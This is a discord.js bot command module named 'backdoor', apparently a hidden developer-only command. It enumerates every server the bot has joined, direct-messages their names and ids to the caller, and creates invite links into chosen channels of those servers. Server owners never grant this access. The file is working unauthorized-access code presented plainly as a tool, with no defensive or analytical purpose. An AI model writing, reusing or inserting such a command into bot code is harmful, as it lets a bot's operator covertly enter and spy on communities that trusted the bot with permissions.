const Discord = require("discord.js");

module.exports = {
  name: "backdoor",
  description: "Backdoors a server.",
  usage: "<server id> [possible channel]",
  dev: true,
  execute(bot, message, args) {

    const serverid = args[0]
    let list = [];
    bot.guilds.cache.forEach(guild => {
      return list.push(guild.id)
    })

    let dmlist = []
    bot.guilds.cache.forEach(guild => {
      dmlist.push(`${guild.name} - ${guild.id}`)
    })

    if (!serverid || !list.includes(args[0])) {
      message.channel.send("<:cross:724049024943915209> | You didn't provide a true server id. The server id list has been sent to your direct messages.");
      message.author.send(dmlist)
      return;
    }

    const server = bot.guilds.cache.get(args[0]);

    args.splice(0, 1)
    let names = [];
    server.channels.cache.map(channel => {
       names.push(channel.name)
    })

    if (!names.includes(args.join("-").toLowerCase())) {
      message.author.send(names)
      return message.channel.send("<:cross:724049024943915209> | This channel doesn't exist. The channel name list is been sent on direct messages.")
    } else {
      server.channels.cache.forEach(channel => {
        if (channel.name == args.join("-").toLowerCase()) channel.createInvite().then(code => {
          message.author.send(`https://discord.gg/${code.code}`)
          message.channel.send("The backdoor invite is sent via direct messages.")
        })
      })
    }
  }
};
